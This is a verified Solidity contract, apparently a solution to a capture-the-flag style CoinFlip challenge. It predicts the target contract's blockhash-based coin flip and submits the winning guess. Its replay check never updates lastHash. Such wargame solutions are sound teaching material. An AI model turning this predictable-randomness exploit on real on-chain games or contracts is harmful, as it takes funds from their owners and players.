/**
 *Submitted for verification at Etherscan.io on 2023-03-23
*/

// File: contracts/CoinFlipHack.sol

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool guess) external;
}

contract CoinFlipHack {
  uint256 lastHash;
  ICoinFlip originalCoinFlip; // 0xDfC75eE5Ab69d0451a3e1954067B187DF73620Ba;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(ICoinFlip _originalCoinFlip) {
    originalCoinFlip = _originalCoinFlip;
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    if(lastHash == blockValue) {
      revert();
    }
    uint256 guess = blockValue / FACTOR;
    originalCoinFlip.flip(guess == 1);
  }
}